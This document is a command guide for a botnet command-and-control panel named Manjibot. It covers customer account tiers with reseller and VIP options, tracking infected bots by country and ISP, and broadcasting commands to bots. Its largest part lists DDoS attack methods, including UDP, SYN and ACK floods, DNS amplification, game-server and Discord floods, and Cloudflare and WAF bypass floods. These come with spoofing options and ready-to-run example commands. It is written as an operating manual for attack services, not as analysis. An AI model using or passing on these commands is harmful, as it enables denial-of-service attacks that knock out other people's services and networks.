# Manjibot CNC Commands Guide

## Table of Contents
- [General Commands](#general-commands)
- [User Management (Admin)](#user-management-admin)
- [Session Management (Admin)](#session-management-admin)
- [Attack Management (Admin)](#attack-management-admin)
- [Bot Monitoring](#bot-monitoring)
- [Bot Distribution Commands (Admin)](#bot-distribution-commands-admin)
- [Theme Commands](#theme-commands)
- [Attack Methods](#attack-methods)

---

## General Commands

| Command | Description |
|---------|-------------|
| `help` | Show the help text from your current theme |
| `?` or `methods` | Show a list of available attack vectors |
| `clear` or `cls` or `c` | Clear the terminal screen |
| `count` | Show total bot count with change since last check |
| `home` or `banner` | Display the CNC banner/splash screen |
| `logout` or `exit` or `quit` | Disconnect from the CNC |
| `passwd` or `changepw` | Change your account password |
| `stats` | Show overall botnet statistics (total bots, cores, RAM) |
| `themes list` | List all available themes |
| `themes set <name>` | Switch to a different theme (e.g. `kairo`, `simple`) |

---

## User Management (Admin)

### `add <preset> <username> <password>`
Create a new user using a preset template.

**Example:**
```
add default newuser secretpass
```

### `users`
List all users with their details including:
- Username, Max Bots, Admin/Superuser/Reseller/VIP status
- Attack count, Max Attack Time, Cooldown

**Example output:**
```
Username   Max Bots   Admin   Superuser   Reseller   VIP   Attacks   Max Time   Cooldown
admin      unlimited  TRUE    TRUE        TRUE       TRUE  0         60         10
```

### `users add <Username> <Password> <Max Bots> <Duration> <Cooldown> <Max Daily Attacks> <Expiry> <Admin> <Reseller> <VIP>`
Add a new user with full control over every setting.

**Parameters:**
| Parameter | Description | Example |
|-----------|-------------|---------|
| `Username` | Account username | `newuser` |
| `Password` | Account password | `secret123` |
| `Max Bots` | Max bots (-1 = unlimited) | `-1` |
| `Duration` | Max attack duration in seconds | `60` |
| `Cooldown` | Cooldown between attacks in seconds | `100` |
| `Max Daily Attacks` | Attack limit per day | `100` |
| `Expiry` | Account expiry (e.g. `7d`, `30d`, `365d`) | `30d` |
| `Admin` | Admin privileges (`true`/`false`) | `false` |
| `Reseller` | Reseller privileges (`true`/`false`) | `false` |
| `VIP` | VIP status (`true`/`false`) | `true` |

**Example:**
```
users add newuser secretpass -1 60 100 100 30d false false true
```

### `users remove <username>`
Delete a user account.

**Example:**
```
users remove newuser
```

### `users edit <username> <field> <value>`
Edit a specific field on a user account.

**Valid fields:**
`password`, `max_bots`, `admin`, `reseller`, `vip`, `maxAttacks`, `maxTime`, `cooldown`, `expiry`

**Example:**
```
users edit newuser maxTime 120
users edit newuser admin true
```

### `users timeout <username> <minutes>`
Temporarily prevent a user from launching attacks.

**Example:**
```
users timeout baduser 30
```

### `users untimeout <username>`
Remove a timeout from a user.

**Example:**
```
users untimeout baduser
```

---

## Session Management (Admin)

### `sessions`
Show all currently active CNC sessions, including:
- Username, IP address, connection type (Telnet/SSH)
- Connection time

### `sessions kick <username>`
Forcefully disconnect a user from the CNC.

**Example:**
```
sessions kick baduser
```

---

## Attack Management (Admin)

### `ongoing` or `bcstats`
Show all currently running attacks with:
- Username who launched the attack
- Full command string used

**Example output:**
```
|------------|-----------------------------------------------------|
|  username  |  command                                             |
|------------|-----------------------------------------------------|
|  admin     |  udp 1.1.1.1 60 dport=80 len=1024                    |
|------------|-----------------------------------------------------|
```

### `broadcast <message>`
Send a text message to all connected bots. Useful for updating or commanding your entire botnet.

**Example:**
```
broadcast Updating binaries - please wait
```

### `attacks enable`
Enable global attacks. When disabled, no users can launch attacks.

### `attacks disable`
Disable all attacks globally. This prevents any user from launching attacks.

### `clogs`
Clear all attack history logs. Will prompt for confirmation.

---

## Bot Monitoring

### `count`
Display the total number of connected bots with the change since your last check.

**Example output:**
```
Total: 1543 (+12)
```

### `stats`
Show detailed botnet statistics including:
- Total bot count
- Total CPU cores across all bots
- Total RAM across all bots
- Distribution by architecture

---

## Bot Distribution Commands (Admin)

### `bots --count` or `bots -c`
Show bot count with color-coded change indicators.

### `bots --basic` or `bots -b`
Show distribution by bot type/group with changes since last check.

**Example output:**
```
home: 450 (+12)
isp1: 320 (-5)
isp2: 200 (+3)
Total: 970
```

### `bots --country <name>`
Show bot count from a specific country by ISP.

**Example:**
```
bots --country US
```

### `bots --country top`
Show the top 5 countries with the most bots.

### `bots --isp <name>`
Show bot count from a specific ISP by country.

**Example:**
```
bots --isp comcast
```

### `bots --isp top`
Show the top 5 ISPs with the most bots.

### `bots --arch <name>`
Show bot count for a specific architecture.

**Example:**
```
bots --arch armv7l
```

### `bots --help` or `bots ?`
Show help for all bot subcommands.

---

## Theme Commands

### `themes list`
List all available themes installed on the CNC.

### `themes set <name>`
Switch to a different theme. Available themes:
- `kairo` - Dark red/black theme
- `simple` - Clean blue theme

**Example:**
```
themes set simple
```

Themes change the colors of prompts, banners, help text, and attack output.

---

## Attack Methods

All attack methods follow this syntax:
```
<method> <target> <port> <duration> [options]
```

**Example:**
```
udp 1.1.1.1 80 60 len=1024
raknet 1.2.3.4 19132 60 len=24
```

### Layer 3/4 Attacks

| Method | Description | ID |
|--------|-------------|:--:|
| `udp` | High GBPS UDP flood. Sends large volumes of UDP packets to saturate bandwidth | 0 |
| `vse` | Valve Source Engine query flood. Sends Source Engine server query packets to game servers | 1 |
| `dns` | DNS amplification attack. Sends spoofed DNS queries to trigger large responses | 2 |
| `syn` | TCP SYN flood. Opens half-open connections to exhaust server connection table | 3 |
| `ack` | TCP ACK flood. Floods with ACK packets to bypass firewalls that allow established connections | 4 |
| `stomp` | TCP handshake + ACK/PSH flood. Establishes connection then floods with ACK/PSH data | 5 |
| `greip` | GRE IP encapsulation flood | 6 |
| `greeth` | GRE Ethernet encapsulation flood | 7 |
| `udpplain` | Simple UDP socket flood. Uses standard UDP sockets (no raw socket needed) | 9 |
| `tcpbypass` | TCP bypass flood. Simple TCP flood designed to bypass mitigation devices | 10 |
| `socket` | Standard socket flood. Opens/destroys TCP connections rapidly | 14 |

### Game Server Attacks

| Method | Description | ID |
|--------|-------------|:--:|
| `raknet` | RakNet game server flood. Sends RakNet unconnected ping packets (Minecraft PE, GTA V, etc.) | 15 |
| `esp` | ESP/IPSec flood. Sends ESP protocol packets to target VPN/security gateways | 16 |
| `udphex` | UDP hex flood. Sends UDP packets with raw hex payload | 17 |
| `fivem` | FiveM game server connect flood. Sends connection requests to FiveM/CFX servers | 18 |
| `discord` | Discord voice gateway flood. Sends WebSocket upgrade requests to Discord gateways | 19 |

### L7 Bypass Attacks

| Method | Description | ID |
|--------|-------------|:--:|
| `http` | HTTP/1.1 GET flood. Sends GET requests to HTTP servers | 20 |
| `pps` | PPS (packets per second) raw flood. Minimal packets for maximum packet rate | 21 |
| `tls` | TLS/SSL handshake flood. Sends TLS ClientHello handshake packets (forces SSL negotiation) | 22 |
| `tlsplus` | TLS+ bypass flood. TLS ClientHello with cipher suite randomization for WAF bypass | 23 |
| `cloudflare` | Cloudflare bypass flood. HTTP requests with varied User-Agents to bypass CF protection | 24 |
| `nerv_l7` | NERV L7 special bypass flood. Mixed HTTP GET/POST/WebSocket patterns to confuse mitigations | 25 |

### Layer 7 (Application Layer)

| Method | Description | ID |
|--------|-------------|:--:|
| `dns` | DNS amplification attack. Sends spoofed DNS queries to trigger large responses | 2 |

### Common Attack Options

| Option | Description | Example |
|--------|-------------|---------|
| `len` | Payload size in bytes | `len=1024` |
| `dport` | Destination port (default: random) | `dport=80` |
| `sport` | Source port (default: random) | `sport=53` |
| `tos` | IP Type of Service value | `tos=0` |
| `ttl` | IP Time To Live | `ttl=255` |
| `df` | Don't Fragment flag | `df=1` |
| `ident` | IP Identification value | `ident=31337` |
| `source` | Custom source IP address | `source=1.1.1.1` |
| `count` | Packet count limit | `count=10000` |
| `path` | HTTP path for web attacks | `path=/index.php` |
| `useragent` | Custom User-Agent string | `useragent="Mozilla/5.0 Chrome/120"` |
| `https` | Enable HTTPS mode for HTTP attacks | `https=1` |
| `cookies` | Set cookies for HTTP attacks | `cookies="session=abc123"` |

### Attack Examples

```
# Basic UDP flood
udp 1.1.1.1 80 60 len=1400

# DNS amplification via specific resolver
dns 1.1.1.1 53 60 domain=example.com

# RakNet flood with custom payload size
raknet 1.1.1.1 19132 120 len=512

# TCP SYN flood with custom options
syn 1.1.1.1 443 60 dport=443 source=10.0.0.1 ttl=64

# UDP hex flood with specific payload
udphex 1.1.1.1 80 60 len=1024

# TCP bypass with don't fragment flag
tcpbypass 1.1.1.1 80 30 df=1

# FiveM server flood
fivem 1.2.3.4 30120 120 len=256

# Discord gateway flood
discord 1.2.3.4 443 60 dport=443

# HTTP GET flood with custom path
http 1.1.1.1 80 60 path=/index.php useragent="Mozilla/5.0"

# PPS flood (max packet rate)
pps 1.1.1.1 80 60 len=0

# TLS handshake flood
tls 1.1.1.1 443 60

# TLS+ bypass flood
tlsplus 1.1.1.1 443 120 len=512

# Cloudflare bypass with cookies
cloudflare 1.1.1.1 443 60 path=/login cookies="session=abc"

# NERV L7 special (mixed patterns)
nerv_l7 1.1.1.1 80 120 path=/api
```
